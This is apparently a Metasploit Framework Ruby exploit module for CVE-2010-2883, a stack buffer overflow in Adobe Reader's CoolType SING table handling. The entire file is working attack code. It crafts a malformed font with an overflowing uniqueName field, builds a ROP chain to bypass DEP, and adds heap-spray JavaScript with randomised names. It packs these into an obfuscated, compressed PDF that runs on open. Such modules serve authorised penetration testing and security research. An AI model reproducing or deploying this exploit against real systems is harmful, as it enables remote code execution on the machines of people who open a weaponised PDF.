##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe CoolType SING Table "uniqueName" Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a vulnerability in the Smart INdependent Glyplets (SING) table
				handling within versions 8.2.4 and 9.3.4 of Adobe Reader. Prior version are
				assumed to be vulnerable as well.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Unknown',    # 0day found in the wild
					'@sn0wfl0w',  # initial analysis
					'@vicheck',   # initial analysis
					'jduck'       # Metasploit module
				],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2010-2883' ],
					[ 'OSVDB', '67849'],
					[ 'URL', 'http://contagiodump.blogspot.com/2010/09/cve-david-leadbetters-one-point-lesson.html' ],
					[ 'URL', 'http://www.adobe.com/support/security/advisories/apsa10-02.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC'             => 'process',
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested OK via Adobe Reader 9.3.4 on Windows XP SP3 -jjd
					[ 'Automatic', { }],
				],
			'DisclosureDate' => 'Sep 07 2010',
			'DefaultTarget'  => 0))

		register_options(
		 	[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
			], self.class)
	end

   def exploit
		ttf_data = make_ttf()

		js_data = make_js(payload.encoded)

		# Create the pdf
		pdf = make_pdf(ttf_data, js_data)

		print_status("Creating '#{datastore['FILENAME']}' file...")

		file_create(pdf)
	end

	def make_ttf
		ttf_data = ""

		# load the static ttf file

		# NOTE: The 0day used Vera.ttf (785d2fd45984c6548763ae6702d83e20)
		path = File.join( Msf::Config.install_root, "data", "exploits", "cve-2010-2883.ttf" )
		fd = File.open( path, "rb" )
		ttf_data = fd.read(fd.stat.size)
		fd.close

		# Build the SING table
		sing = ''
		sing << [
			0, 1,   # tableVersionMajor, tableVersionMinor (0.1)
			0xe01,  # glyphletVersion
			0x100,  # embeddingInfo
			0,      # mainGID
			0,      # unitsPerEm
			0,      # vertAdvance
			0x3a00  # vertOrigin
		].pack('vvvvvvvv')
		# uniqueName
		# "The uniqueName string must be a string of at most 27 7-bit ASCII characters"
		sing << "A" * (0x254 - sing.length)

		# 0xffffffff gets written here @ 0x7001400 (in BIB.dll)
		sing[0x140, 4] = [0x08231060 - 0x1c].pack('V')

		# This becomes our new EIP (puts esp to stack buffer)
		ret = 0x81586a5 # add ebp, 0x794 / leave / ret
		sing[0x208, 4] = [ret].pack('V')

		# This becomes the new eip after the first return
		ret = 0x806c57e
		sing[0x18, 4] = [ret].pack('V')

		# This becomes the new esp after the first return
		esp = 0x0c0c0c0c
		sing[0x1c, 4] = [esp].pack('V')
		
		# Without the following, sub_801ba57 returns 0.
		sing[0x24c, 4] = [0x6c].pack('V')

		ttf_data[0xec, 4] = "SING"
		ttf_data[0x11c, sing.length] = sing

		#File.open("/tmp/woop.ttf", "wb") { |fd| fd.write(ttf_data) }

		ttf_data
	end

	def make_js(encoded_payload)

		# The following executes a ret2lib using BIB.dll
		# The effect is to bypass DEP and execute the shellcode in an indirect way
		stack_data = [
			0xc0c0c0c,
			0x7004919,      # pop ecx / pop ecx / mov [eax+0xc0],1 / pop esi / pop ebx / ret
			0xcccccccc,
			0x70048ef,      # xchg eax,esp / ret
			0x700156f,      # mov eax,[ecx+0x34] / push [ecx+0x24] / call [eax+8]
			0xcccccccc,
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009033,      # ret 0x18
			0x7009084,      # ret
			0xc0c0c0c,
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7001599,      # pop ebp / ret
			0x10124,
			0x70072f7,      # pop eax / ret
			0x10104,
			0x70015bb,      # pop ecx / ret
			0x1000,
			0x700154d,      # mov [eax], ecx / ret
			0x70015bb,      # pop ecx / ret
			0x7ffe0300,     # -- location of KiFastSystemCall
			0x7007fb2,      # mov eax, [ecx] / ret
			0x70015bb,      # pop ecx / ret
			0x10011,
			0x700a8ac,      # mov [ecx], eax / xor eax,eax / ret
			0x70015bb,      # pop ecx / ret
			0x10100,
			0x700a8ac,      # mov [ecx], eax / xor eax,eax / ret
			0x70072f7,      # pop eax / ret
			0x10011,
			0x70052e2,      # call [eax] / ret -- (KiFastSystemCall - VirtualAlloc?)
			0x7005c54,      # pop esi / add esp,0x14 / ret
			0xffffffff,
			0x10100,
			0x0,
			0x10104,
			0x1000,
			0x40,
			# The next bit effectively copies data from the interleaved stack to the memory
			# pointed to by eax
			# The data copied is:
			# \x5a\x90\x54\x90\x5a\xeb\x15\x58\x8b\x1a\x89\x18\x83\xc0\x04\x83
			# \xc2\x04\x81\xfb\x0c\x0c\x0c\x0c\x75\xee\xeb\x05\xe8\xe6\xff\xff
			# \xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xff\xff\xff\x90
			0x700d731,      # mov eax, [ebp-0x24] / ret
			0x70015bb,      # pop ecx / ret
			0x9054905a,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x5815eb5a,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x18891a8b,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x8304c083,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0xfb8104c2,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0xc0c0c0c,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x5ebee75,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0xffffe6e8,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x909090ff,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x90909090,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x90909090,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x90ffffff,
			0x700154d,      # mov [eax], ecx / ret
			0x700d731,      # mov eax, [ebp-0x24] / ret
			0x700112f       # call eax -- (execute stub to transition to full shellcode)
		].pack('V*')

		var_unescape  = rand_text_alpha(rand(100) + 1)
		var_shellcode = rand_text_alpha(rand(100) + 1)

		var_start     = rand_text_alpha(rand(100) + 1)

		var_s         = 0x10000
		var_c         = rand_text_alpha(rand(100) + 1)
		var_b         = rand_text_alpha(rand(100) + 1)
		var_d         = rand_text_alpha(rand(100) + 1)
		var_3         = rand_text_alpha(rand(100) + 1)
		var_i         = rand_text_alpha(rand(100) + 1)
		var_4         = rand_text_alpha(rand(100) + 1)

		payload_buf = ''
		payload_buf << stack_data
		payload_buf << encoded_payload

		escaped_payload = Rex::Text.to_unescape(payload_buf)

		js = %Q|
var #{var_unescape} = unescape;
var #{var_shellcode} = #{var_unescape}( '#{escaped_payload}' );
var #{var_c} = #{var_unescape}( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );
while (#{var_c}.length + 20 + 8 < #{var_s}) #{var_c}+=#{var_c};
#{var_b} = #{var_c}.substring(0, (0x0c0c-0x24)/2);
#{var_b} += #{var_shellcode};
#{var_b} += #{var_c};
#{var_d} = #{var_b}.substring(0, #{var_s}/2);
while(#{var_d}.length < 0x80000) #{var_d} += #{var_d};
#{var_3} = #{var_d}.substring(0, 0x80000 - (0x1020-0x08) / 2);
var #{var_4} = new Array();
for (#{var_i}=0;#{var_i}<0x1f0;#{var_i}++) #{var_4}[#{var_i}]=#{var_3}+"s";
|

		js
	end

	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end

	def ioDef(id)
		"%d 0 obj \n" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end


	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)
		#return str
		result = ""
		str.scan(/./u) do |c|
			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack("C*")[0]
			else
				result << c
			end
		end
		result
	end


	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end


	def make_pdf(ttf, js)

		#swf_name = rand_text_alpha(8 + rand(8)) + ".swf"

		xref = []
		eol = "\n"
		endobj = "endobj" << eol

		# Randomize PDF version?
		pdf = "%PDF-1.5" << eol
		pdf << "%" << RandomNonASCIIString(4) << eol

		# catalog
		xref << pdf.length
		pdf << ioDef(1) << nObfu("<<") << eol
		pdf << nObfu("/Pages ") << ioRef(2) << eol
		pdf << nObfu("/Type /Catalog") << eol
		pdf << nObfu("/OpenAction ") << ioRef(11) << eol
		pdf << nObfu(">>") << eol
		pdf << endobj

		# pages array
		xref << pdf.length
		pdf << ioDef(2) << nObfu("<<") << eol
		pdf << nObfu("/MediaBox ") << ioRef(3) << eol
		pdf << nObfu("/Resources ") << ioRef(4) << eol
		pdf << nObfu("/Kids [") << ioRef(5) << "]" << eol
		pdf << nObfu("/Count 1") << eol
		pdf << nObfu("/Type /Pages") << eol
		pdf << nObfu(">>") << eol
		pdf << endobj

		# media box
		xref << pdf.length
		pdf << ioDef(3)
		pdf << "[0 0 595 842]" << eol
		pdf << endobj

		# resources
		xref << pdf.length
		pdf << ioDef(4)
		pdf << nObfu("<<") << eol
		pdf << nObfu("/Font ") << ioRef(6) << eol
		pdf << ">>" << eol
		pdf << endobj

		# page 1
		xref << pdf.length
		pdf << ioDef(5) << nObfu("<<") << eol
		pdf << nObfu("/Parent ") << ioRef(2) << eol
		pdf << nObfu("/MediaBox ") << ioRef(3) << eol
		pdf << nObfu("/Resources ") << ioRef(4) << eol
		#pdf << nObfu("/MediaBox [0 0 640 480]")
		#pdf << "<<"
		#if true
		#	pdf << nObfu("/ProcSet [ /PDF /Text ]") << eol
		#	pdf << nObfu("/Font << /F1 ") << ioRef(8) << nObfu(">>") << eol
		#end
		#pdf << nObfu(">>") << eol # end resources
		pdf << nObfu("/Contents [") << ioRef(8) << nObfu("]") << eol
		#pdf << nObfu("/Annots [") << ioRef(7) << nObfu("]") << eol
		pdf << nObfu("/Type /Page") << eol
		pdf << nObfu(">>") << eol # end obj dict
		pdf << endobj

		# font
		xref << pdf.length
		pdf << ioDef(6) << nObfu("<<") << eol
		pdf << nObfu("/F1 ") << ioRef(7) << eol
		pdf << ">>" << eol
		pdf << endobj

		# ttf object
		xref << pdf.length
		pdf << ioDef(7) << nObfu("<<") << eol
		pdf << nObfu("/Type /Font") << eol
		pdf << nObfu("/Subtype /TrueType") << eol
		pdf << nObfu("/Name /F1") << eol
		pdf << nObfu("/BaseFont /Cinema") << eol
		#pdf << nObfu("/FirstChar 0")
		#pdf << nObfu("/LastChar 255")
		pdf << nObfu("/Widths []") << eol
		#256.times {
		#	pdf << "%d " % rand(256)
		#}
		#pdf << "]" << eol
		pdf << nObfu("/FontDescriptor ") << ioRef(9)
		pdf << nObfu("/Encoding /MacRomanEncoding")
		#pdf << nObfu("/FontBBox [-177 -269 1123 866]")
		#pdf << nObfu("/FontFile2 ") << ioRef(9)
		pdf << nObfu(">>") << eol
		pdf << endobj

		# page content
		content = "Hello World!"
		content = "" +
			"0 g" + eol +
			"BT" + eol +
			"/F1 32 Tf" + eol +
			#"  10 10 Td" + eol +
			"32 Tc" + eol +
			"1 0 0 1 32 773.872 Tm" + eol +
			#"2 Tr" + eol +
			"(" + content + ") Tj" + eol +
			"ET"

		xref << pdf.length
		pdf << ioDef(8) << "<<" << eol
		pdf << nObfu("/Length %s" % content.length) << eol
		pdf << ">>" << eol
		pdf << "stream" << eol
		pdf << content << eol
		pdf << "endstream" << eol
		pdf << endobj

		# font descriptor
		xref << pdf.length
		pdf << ioDef(9) << nObfu("<<")
		pdf << nObfu("/Type/FontDescriptor/FontName/Cinema")
		pdf << nObfu("/Flags %d" % (2**2 + 2**6 + 2**17))
		pdf << nObfu("/FontBBox [-177 -269 1123 866]")
		pdf << nObfu("/FontFile2 ") << ioRef(10)
		pdf << nObfu(">>") << eol
		pdf << endobj

		# ttf stream
		xref << pdf.length
		pdf << ioDef(10) << nObfu("<</Length %s /Length1 %s>>" % [ttf.length, ttf.length]) << eol
		pdf << "stream" << eol
		pdf << ttf << eol
		pdf << "endstream" << eol
		pdf << endobj

		# js action
		xref << pdf.length
		pdf << ioDef(11) << nObfu("<<")
		pdf << nObfu("/Type/Action/S/JavaScript/JS ") + ioRef(12)
		pdf << nObfu(">>") << eol
		pdf << endobj

		# js stream
		xref << pdf.length
		compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js))
		pdf << ioDef(12) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << endobj

		# trailing stuff
		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end

		pdf << "trailer" << eol
		pdf << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(1) << ">>" << eol

		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol

		pdf << "%%EOF" << eol
		pdf
	end

end
